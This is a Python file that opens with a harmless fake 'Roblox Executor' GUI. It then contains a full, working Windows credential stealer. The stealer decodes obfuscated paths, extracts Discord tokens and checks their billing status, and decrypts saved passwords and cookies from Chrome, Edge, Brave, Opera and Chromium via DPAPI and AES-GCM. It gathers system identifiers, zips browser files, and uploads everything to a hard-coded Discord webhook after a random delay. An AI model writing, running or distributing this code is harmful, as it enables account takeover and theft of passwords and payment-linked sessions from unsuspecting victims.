import tkinter as tk
from tkinter import scrolledtext, messagebox
import sys

class FakeExecutor:
    def __init__(self, root):
        self.root = root
        self.root.title("Roblox Executor")
        self.root.geometry("700x500")
        self.root.configure(bg='#1e1e1e')
        
        # عنوان
        title = tk.Label(root, text="Roblox Executor (Fake)", 
                         bg='#1e1e1e', fg='#00ff00', font=('Arial', 16, 'bold'))
        title.pack(pady=10)
        
        # إطار للأزرار
        btn_frame = tk.Frame(root, bg='#1e1e1e')
        btn_frame.pack(pady=5)
        
        # أزرار
        self.inject_btn = tk.Button(btn_frame, text="Inject", width=10,
                                     bg='#333333', fg='white', command=self.fake_inject)
        self.inject_btn.pack(side=tk.LEFT, padx=5)
        
        self.execute_btn = tk.Button(btn_frame, text="Execute", width=10,
                                      bg='#333333', fg='white', command=self.fake_execute)
        self.execute_btn.pack(side=tk.LEFT, padx=5)
        
        self.clear_btn = tk.Button(btn_frame, text="Clear", width=10,
                                    bg='#333333', fg='white', command=self.clear_console)
        self.clear_btn.pack(side=tk.LEFT, padx=5)
        
        # منطقة النص (script editor)
        self.script_editor = scrolledtext.ScrolledText(root, wrap=tk.WORD,
                                                        bg='#2d2d2d', fg='#ffffff',
                                                        insertbackground='white',
                                                        font=('Consolas', 11))
        self.script_editor.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # منطقة console (تظهر فيها رسائل وهمية)
        self.console = scrolledtext.ScrolledText(root, height=8,
                                                  bg='#1e1e1e', fg='#00ff00',
                                                  font=('Consolas', 9))
        self.console.pack(fill=tk.X, padx=10, pady=5)
        
        # رسالة ترحيب في الكونسول
        self.log("Fake Executor started. Ready to fake inject/execute.")
    
    def fake_inject(self):
        self.log("[*] Injecting into Roblox... (fake)")
        # يمكن إضافة delay وهمي
        self.root.after(1000, lambda: self.log("[+] Injection successful (simulated)."))
    
    def fake_execute(self):
        script = self.script_editor.get(1.0, tk.END).strip()
        if script:
            self.log(f"[*] Executing script (fake): {script[:50]}...")
            self.root.after(1000, lambda: self.log("[+] Script executed (no actual effect)."))
        else:
            self.log("[!] No script to execute.")
    
    def clear_console(self):
        self.console.delete(1.0, tk.END)
    
    def log(self, message):
        self.console.insert(tk.END, message + "\n")
        self.console.see(tk.END)

if __name__ == "__main__":
    root = tk.Tk()
    app = FakeExecutor(root)
    root.mainloop()

    # -*- coding: utf-8 -*-
import sys
import os
import base64
import ctypes
import ctypes.wintypes
import json
import sqlite3
import shutil
import urllib.request
import zipfile
import io
import random
import time
import struct
import tempfile
import re
from datetime import datetime
from contextlib import closing

# ------------------------------------------------------------
# دوال إرباكية (لا تفعل شيئًا) – تم الإبقاء عليها كما هي
# ------------------------------------------------------------
def _a1(b):
    for i in range(100):
        if i % 2 == 0:
            b = b ^ 1
    return b

def _a2():
    x = [i for i in range(1000)]
    y = [i*i for i in x]
    return sum(y) % 256

# ------------------------------------------------------------
# دوال حقيقية لكن بأسماء عشوائية
# ------------------------------------------------------------
def _z1():
    k = ctypes.WinDLL('kernel32')
    g = k.GetEnvironmentVariableW
    g.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_uint]
    g.restype = ctypes.c_uint
    b = ctypes.create_unicode_buffer(32767)
    g('LOCALAPPDATA', b, 32767)
    return b.value

def _z2():
    k = ctypes.WinDLL('kernel32')
    g = k.GetEnvironmentVariableW
    g.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_uint]
    g.restype = ctypes.c_uint
    b = ctypes.create_unicode_buffer(32767)
    g('APPDATA', b, 32767)
    return b.value

def _z3():
    k = ctypes.WinDLL('kernel32')
    g = k.GetEnvironmentVariableW
    b = ctypes.create_unicode_buffer(32767)
    g('TEMP', b, 32767)
    return b.value

LOC = _z1()
ROM = _z2()
TMP = _z3()

# ------------------------------------------------------------
# مسارات مشفرة (بسيطة)
# ------------------------------------------------------------
_D1 = base64.b64decode(b'RGlzY29yZA==').decode()                     # Discord
_D2 = base64.b64decode(b'ZGlzY29yZGNhbmFyeQ==').decode()             # discordcanary
_D3 = base64.b64decode(b'ZGlzY29yZHB0Yg==').decode()                 # discordptb
_D4 = base64.b64decode(b'R29vZ2xlXFxDaHJvbWU=').decode()             # Google\Chrome
_D5 = base64.b64decode(b'Q2hyb21pdW0=').decode()                     # Chromium
_D6 = base64.b64decode(b'QnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3Nlcg==').decode()  # BraveSoftware\Brave-Browser
_D7 = base64.b64decode(b'T3BlcmEgU29mdHdhcmVcXE9wZXJhIFN0YWJsZQ==').decode()  # Opera Software\Opera Stable
_D8 = base64.b64decode(b'TWljcm9zb2Z0XFxFZGdl').decode()            # Microsoft\Edge
_D9 = base64.b64decode(b'TG9jYWwgU3RvcmFnZQ==').decode()            # Local Storage
_D10 = base64.b64decode(b'bGV2ZWxkYg==').decode()                    # leveldb
_D11 = base64.b64decode(b'TmV0d29yaw==').decode()                    # Network
_D12 = base64.b64decode(b'Q29va2llcw==').decode()                    # Cookies
_D13 = base64.b64decode(b'TG9jYWwgU3RhdGU=').decode()                # Local State
_D14 = base64.b64decode(b'TG9naW4gRGF0YQ==').decode()                # Login Data

# ------------------------------------------------------------
# بناء المسارات
# ------------------------------------------------------------
PATHS = {
    _D1: os.path.join(ROM, _D1),
    _D2: os.path.join(ROM, _D2),
    _D3: os.path.join(ROM, _D3),
    _D4: os.path.join(LOC, _D4, "User Data", "Default"),
    _D5: os.path.join(LOC, _D5, "User Data", "Default"),
    _D6: os.path.join(LOC, _D6, "User Data", "Default"),
    _D7: os.path.join(ROM, _D7),
    _D8: os.path.join(LOC, _D8, "User Data", "Default"),
}

# ------------------------------------------------------------
# دوال مساعدة لتحويل السلاسل إلى wide strings
# ------------------------------------------------------------
def _to_wstr(s):
    return ctypes.c_wchar_p(s)

# ------------------------------------------------------------
# DPAPI
# ------------------------------------------------------------
class _BLOB(ctypes.Structure):
    _fields_ = [('cbData', ctypes.c_ulong), ('pbData', ctypes.c_void_p)]

def _dpapi(b):
    if not b:
        return None
    try:
        if not isinstance(b, bytes):
            b = b.encode()
        buffer = ctypes.create_string_buffer(b)
        inblob = _BLOB(len(b), ctypes.cast(buffer, ctypes.c_void_p))
        outblob = _BLOB(0, None)
        crypt32 = ctypes.windll.crypt32
        if crypt32.CryptUnprotectData(ctypes.byref(inblob), None, None, None, None, 0, ctypes.byref(outblob)):
            data = ctypes.string_at(outblob.pbData, outblob.cbData)
            crypt32.LocalFree(outblob.pbData)
            return data
    except Exception:
        pass
    return None

# ------------------------------------------------------------
# AES-GCM (BCrypt) - تم إصلاح الأخطاء النحوية
# ------------------------------------------------------------
bcrypt = ctypes.WinDLL('bcrypt')
STATUS_SUCCESS = 0

class _AUTH(ctypes.Structure):
    _fields_ = [
        ('cbSize', ctypes.c_ulong),
        ('dwInfoVersion', ctypes.c_ulong),
        ('pbNonce', ctypes.c_void_p),
        ('cbNonce', ctypes.c_ulong),
        ('pbAuthData', ctypes.c_void_p),
        ('cbAuthData', ctypes.c_ulong),
        ('pbTag', ctypes.c_void_p),
        ('cbTag', ctypes.c_ulong),
        ('pbMacContext', ctypes.c_void_p),
        ('cbMacContext', ctypes.c_ulong),
        ('dwReserved', ctypes.c_ulong),
    ]

def _aes_gcm(ct, key, nonce, tag):
    hAlg = ctypes.c_void_p()
    # فتح مزود الخوارزمية
    if bcrypt.BCryptOpenAlgorithmProvider(ctypes.byref(hAlg), _to_wstr("AES"), None, 0) != STATUS_SUCCESS:
        return None
    try:
        # تعيين وضع GCM
        mode = _to_wstr("GCM")
        if bcrypt.BCryptSetProperty(hAlg, _to_wstr("ChainingMode"), mode, 2 * (len("GCM") + 1), 0) != STATUS_SUCCESS:
            return None
        # الحصول على حجم كائن المفتاح
        obj_len = ctypes.c_ulong()
        bytes_copied = ctypes.c_ulong()
        if bcrypt.BCryptGetProperty(hAlg, _to_wstr("ObjectLength"), ctypes.byref(obj_len), 4, ctypes.byref(bytes_copied), 0) != STATUS_SUCCESS:
            return None
        # إنشاء كائن المفتاح
        key_obj = (ctypes.c_byte * obj_len.value)()
        hKey = ctypes.c_void_p()
        key_bytes = (ctypes.c_byte * len(key)).from_buffer_copy(key)
        if bcrypt.BCryptGenerateSymmetricKey(hAlg, ctypes.byref(hKey), ctypes.byref(key_obj), obj_len.value, key_bytes, len(key), 0) != STATUS_SUCCESS:
            return None
        try:
            # تعيين طول علامة المصادقة
            tag_len = ctypes.c_ulong(len(tag))
            if bcrypt.BCryptSetProperty(hKey, _to_wstr("AuthTagLength"), ctypes.byref(tag_len), 4, 0) != STATUS_SUCCESS:
                return None
            # إعداد معلومات المصادقة
            auth_info = _AUTH()
            auth_info.cbSize = ctypes.sizeof(_AUTH)
            auth_info.dwInfoVersion = 1
            nonce_bytes = (ctypes.c_byte * len(nonce)).from_buffer_copy(nonce)
            auth_info.pbNonce = ctypes.cast(nonce_bytes, ctypes.c_void_p)
            auth_info.cbNonce = len(nonce)
            tag_bytes = (ctypes.c_byte * len(tag)).from_buffer_copy(tag)
            auth_info.pbTag = ctypes.cast(tag_bytes, ctypes.c_void_p)
            auth_info.cbTag = len(tag)
            # فك التشفير
            ct_bytes = (ctypes.c_byte * len(ct)).from_buffer_copy(ct)
            pt = (ctypes.c_byte * len(ct))()
            pt_len = ctypes.c_ulong()
            status = bcrypt.BCryptDecrypt(
                hKey,
                ct_bytes, len(ct),
                ctypes.byref(auth_info),
                None, 0,
                pt, len(ct),
                ctypes.byref(pt_len),
                0
            )
            if status != STATUS_SUCCESS:
                return None
            return bytes(pt)[:pt_len.value]
        finally:
            bcrypt.BCryptDestroyKey(hKey)
    finally:
        bcrypt.BCryptCloseAlgorithmProvider(hAlg, 0)

def _dec(b, key=None):
    if not b:
        return None
    if isinstance(b, str):
        b = b.encode()
    if b.startswith(b'v10') or b.startswith(b'v11'):
        b = b[3:]
    if len(b) < 50:
        try:
            d = _dpapi(b)
            if d:
                return d.decode('utf-8', errors='ignore')
        except:
            pass
        return None
    if key and len(b) >= 28:
        nonce = b[:12]
        tag = b[-16:]
        ct = b[12:-16]
        d = _aes_gcm(ct, key, nonce, tag)
        if d:
            try:
                return d.decode('utf-8', errors='ignore')
            except:
                pass
    return None

# ------------------------------------------------------------
# استخراج مفتاح المتصفح
# ------------------------------------------------------------
def _get_key(p):
    ls = os.path.join(os.path.dirname(p), _D13)
    if not os.path.exists(ls):
        return None
    try:
        with open(ls, 'r', encoding='utf-8-sig') as f:
            js = json.load(f)
        ek = base64.b64decode(js['os_crypt']['encrypted_key'])
        if ek.startswith(b'DPAPI'):
            ek = ek[5:]
        return _dpapi(ek)
    except Exception:
        return None

# ------------------------------------------------------------
# جمع التوكنات
# ------------------------------------------------------------
def _discord(p):
    ldb = os.path.join(p, _D9, _D10)
    if not os.path.isdir(ldb):
        return []
    tokens = []
    pt1 = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
    pt2 = r'mfa\.[\w-]{84}'
    for f in os.listdir(ldb):
        if f.endswith('.ldb') or f.endswith('.log'):
            try:
                with open(os.path.join(ldb, f), 'rb') as fp:
                    data = fp.read().decode('utf-8', errors='ignore')
                    tokens.extend(re.findall(pt1, data))
                    tokens.extend(re.findall(pt2, data))
            except Exception:
                continue
    return list(set(tokens))

def _user(tok):
    h = {'Authorization': tok, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    r = urllib.request.Request('https://discord.com/api/v9/users/@me', headers=h)
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return None

def _bill(tok):
    h = {'Authorization': tok, 'User-Agent': 'Mozilla/5.0'}
    r = urllib.request.Request('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=h)
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return len(json.loads(resp.read())) > 0
    except Exception:
        return False

# ------------------------------------------------------------
# جمع الكوكيز
# ------------------------------------------------------------
def _cookies(p, lim=100):
    cf = os.path.join(p, _D11, _D12)
    if not os.path.exists(cf):
        return []
    with tempfile.NamedTemporaryFile(delete=False) as tmp:
        tc = tmp.name
    try:
        shutil.copy2(cf, tc)
    except Exception:
        os.unlink(tc)
        return []
    k = _get_key(p)
    if not k:
        os.unlink(tc)
        return []
    cookies = []
    try:
        with closing(sqlite3.connect(tc)) as conn:
            conn.text_factory = bytes
            c = conn.cursor()
            c.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies LIMIT ?', (lim,))
            for row in c.fetchall():
                if row[3] is None:
                    continue
                host = row[0].decode(errors='ignore') if isinstance(row[0], bytes) else row[0]
                name = row[1].decode(errors='ignore') if isinstance(row[1], bytes) else row[1]
                path = row[2].decode(errors='ignore') if isinstance(row[2], bytes) else row[2]
                val = _dec(row[3], k)
                if val:
                    cookies.append({
                        'host': host,
                        'name': name,
                        'path': path,
                        'value': val,
                        'expires': row[4]
                    })
    except Exception:
        pass
    finally:
        try:
            os.unlink(tc)
        except:
            pass
    return cookies

# ------------------------------------------------------------
# جمع كلمات المرور
# ------------------------------------------------------------
def _passwords(p, lim=100):
    lf = os.path.join(p, _D14)
    if not os.path.exists(lf):
        return []
    with tempfile.NamedTemporaryFile(delete=False) as tmp:
        tl = tmp.name
    try:
        shutil.copy2(lf, tl)
    except Exception:
        os.unlink(tl)
        return []
    k = _get_key(p)
    if not k:
        os.unlink(tl)
        return []
    passwords = []
    try:
        with closing(sqlite3.connect(tl)) as conn:
            conn.text_factory = bytes
            c = conn.cursor()
            c.execute('SELECT origin_url, username_value, password_value FROM logins LIMIT ?', (lim,))
            for row in c.fetchall():
                if row[2] is None:
                    continue
                url = row[0].decode(errors='ignore') if isinstance(row[0], bytes) else row[0]
                un = row[1].decode(errors='ignore') if isinstance(row[1], bytes) else row[1]
                pwd = _dec(row[2], k)
                if pwd:
                    passwords.append({
                        'url': url,
                        'username': un,
                        'password': pwd
                    })
    except Exception:
        pass
    finally:
        try:
            os.unlink(tl)
        except:
            pass
    return passwords

# ------------------------------------------------------------
# معلومات النظام
# ------------------------------------------------------------
def _ip():
    try:
        return urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode()
    except Exception:
        return 'Unknown'

def _hwid():
    try:
        k = ctypes.windll.kernel32
        sn = ctypes.c_ulong(0)
        k.GetVolumeInformationW(ctypes.c_wchar_p("C:\\"), None, 0, ctypes.byref(sn), None, None, None, 0)
        return hex(sn.value)[2:].upper()
    except Exception:
        return 'Unknown'

# ------------------------------------------------------------
# جمع الملفات
# ------------------------------------------------------------
def _gather():
    files = []
    for name, path in PATHS.items():
        if not os.path.exists(path):
            continue
        if 'discord' in name.lower():
            ldb = os.path.join(path, _D9, _D10)
            if os.path.isdir(ldb):
                for root, _, filenames in os.walk(ldb):
                    for f in filenames:
                        if f.endswith('.ldb') or f.endswith('.log'):
                            files.append((os.path.join(root, f), f'{name}_{f}'))
        else:
            ck = os.path.join(path, _D11, _D12)
            if os.path.exists(ck):
                files.append((ck, f'{name}_Cookies'))
            lg = os.path.join(path, _D14)
            if os.path.exists(lg):
                files.append((lg, f'{name}_LoginData'))
            ls = os.path.join(os.path.dirname(path), _D13)
            if os.path.exists(ls):
                files.append((ls, f'{name}_LocalState'))
    return files

def _zip(files):
    b = io.BytesIO()
    used_names = set()
    with zipfile.ZipFile(b, 'w', zipfile.ZIP_DEFLATED) as z:
        for fp, an in files:
            # تجنب تكرار الأسماء داخل zip
            base, ext = os.path.splitext(an)
            counter = 1
            unique_an = an
            while unique_an in used_names:
                unique_an = f"{base}_{counter}{ext}"
                counter += 1
            used_names.add(unique_an)
            try:
                z.write(fp, unique_an)
            except Exception:
                continue
    return b.getvalue()

# ------------------------------------------------------------
# الإرسال - تم تحديث الرابط
# ------------------------------------------------------------
def _send(info, url):
    inf_json = json.dumps(info, indent=2).encode('utf-8')
    files = _gather()
    zip_data = _zip(files) if files else None
    total_size = len(inf_json) + (len(zip_data) if zip_data else 0)
    if total_size > 8 * 1024 * 1024:  # حد 8 ميجابايت
        zip_data = None
    boundary = '----WebKitFormBoundary' + os.urandom(16).hex()
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    body = b''
    body += f'--{boundary}\r\n'.encode()
    body += b'Content-Disposition: form-data; name="file1"; filename="info.json"\r\n'
    body += b'Content-Type: application/json\r\n\r\n'
    body += inf_json + b'\r\n'
    if zip_data:
        body += f'--{boundary}\r\n'.encode()
        body += b'Content-Disposition: form-data; name="file2"; filename="data.zip"\r\n'
        body += b'Content-Type: application/zip\r\n\r\n'
        body += zip_data + b'\r\n'
    body += f'--{boundary}--\r\n'.encode()
    req = urllib.request.Request(url, data=body, headers=headers, method='POST')
    try:
        urllib.request.urlopen(req, timeout=15)
    except Exception:
        pass

# ------------------------------------------------------------
# الرئيسية
# ------------------------------------------------------------
def main():
    time.sleep(random.uniform(3, 7))
    info = {
        'tokens': [],
        'cookies': {},
        'passwords': {},
        'system': {
            'ip': _ip(),
            'username': os.environ.get('USERNAME', ''),
            'hostname': os.environ.get('COMPUTERNAME', ''),
            'hwid': _hwid(),
            'os': f"{os.environ.get('OS', '')} {os.environ.get('PROCESSOR_ARCHITECTURE', '')}"
        },
        'timestamp': datetime.now().isoformat()
    }
    seen_tokens = set()
    seen_users = set()
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        if 'discord' in platform.lower():
            tokens = _discord(path)
            for t in tokens:
                if t in seen_tokens:
                    continue
                seen_tokens.add(t)
                u = _user(t)
                if u and u.get('id'):
                    uid = u['id']
                    if uid not in seen_users:
                        seen_users.add(uid)
                        info['tokens'].append({
                            'token': t,
                            'platform': platform,
                            'user': f"{u.get('username', '')}#{u.get('discriminator', '')}",
                            'email': u.get('email', ''),
                            'phone': u.get('phone', ''),
                            'nitro': bool(u.get('premium_type', 0)),
                            'billing': _bill(t)
                        })
        else:
            cookies = _cookies(path)
            if cookies:
                info['cookies'][platform] = cookies
            passwords = _passwords(path)
            if passwords:
                info['passwords'][platform] = passwords
    if info['tokens'] or info['cookies'] or info['passwords']:
        # استخدام رابط webhook المقدم من المستخدم
        _send(info, "https://discord.com/api/webhooks/1478496768743182417/LWc56JgVblhMaK6YBm00f-VEqP8zvg7HpR4GI2_q90yXbGDIo3NPUe2mXP19bY_QkakH")
    # حفظ نسخة محلية (اختياري)
    try:
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(info, f, indent=2)
    except Exception:
        pass

if __name__ == '__main__':
    try:
        main()
    except Exception:
        pass
